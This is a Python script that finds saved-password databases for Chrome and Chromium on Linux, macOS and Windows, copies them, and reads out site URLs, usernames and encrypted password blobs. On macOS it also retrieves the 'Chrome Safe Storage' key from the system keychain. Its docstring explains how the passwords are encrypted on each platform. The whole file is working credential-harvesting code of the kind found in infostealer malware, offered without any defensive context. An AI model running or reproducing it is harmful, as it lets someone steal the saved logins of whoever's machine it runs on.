import os
import sqlite3
import subprocess
import shutil
import tempfile
import platform

def extract_chrome_passwords():
    """Extract saved passwords from Chrome Login Data SQLite DB.
    Chrome locks the DB while running, so we copy it first.
    On Linux: password_value is AES-CBC encrypted with PBKDF2 key from gnome-keyring.
    On macOS: key derived from 'security find-generic-password -wa Chrome Safe Storage'.
    On Windows: password_value is DPAPI-encrypted (CryptUnprotectData).
    """
    home = os.path.expanduser('~')
    sys_name = platform.system()
    profile_paths = []
    if sys_name == 'Linux':
        for browser_dir in ['google-chrome', 'chromium']:
            base = os.path.join(home, '.config', browser_dir)
            if os.path.isdir(base):
                for entry in os.listdir(base):
                    db = os.path.join(base, entry, 'Login Data')
                    if os.path.isfile(db):
                        profile_paths.append(db)
    elif sys_name == 'Darwin':
        base = os.path.join(home, 'Library', 'Application Support', 'Google', 'Chrome')
        if os.path.isdir(base):
            for entry in os.listdir(base):
                db = os.path.join(base, entry, 'Login Data')
                if os.path.isfile(db):
                    profile_paths.append(db)
    elif sys_name == 'Windows':
        appdata = os.environ.get('LOCALAPPDATA', '')
        base = os.path.join(appdata, 'Google', 'Chrome', 'User Data')
        if os.path.isdir(base):
            for entry in os.listdir(base):
                db = os.path.join(base, entry, 'Login Data')
                if os.path.isfile(db):
                    profile_paths.append(db)
    results = []
    for db_path in profile_paths:
        tmp_fd, tmp_path = tempfile.mkstemp(suffix='.db')
        os.close(tmp_fd)
        try:
            shutil.copy2(db_path, tmp_path)
            conn = sqlite3.connect(tmp_path)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value, date_created FROM logins')
            for url, user, pwd_blob, created in cursor.fetchall():
                if user:
                    results.append({'profile': db_path, 'url': url, 'username': user,
                                    'password_blob_len': len(pwd_blob), 'date_created': created})
            conn.close()
        except sqlite3.OperationalError as e:
            results.append({'profile': db_path, 'error': str(e)})
        finally:
            os.unlink(tmp_path)
    decryption_key = None
    if sys_name == 'Darwin':
        try:
            proc = subprocess.run(['security', 'find-generic-password', '-wa', 'Chrome Safe Storage'],
                                  capture_output=True, text=True, timeout=5)
            if proc.returncode == 0:
                decryption_key = proc.stdout.strip()
        except Exception:
            pass
    return {'system': sys_name, 'profiles_found': len(profile_paths),
            'credentials': results, 'decryption_key_available': decryption_key is not None}

if __name__ == '__main__':
    import json
    out = extract_chrome_passwords()
    print(json.dumps(out, indent=2))

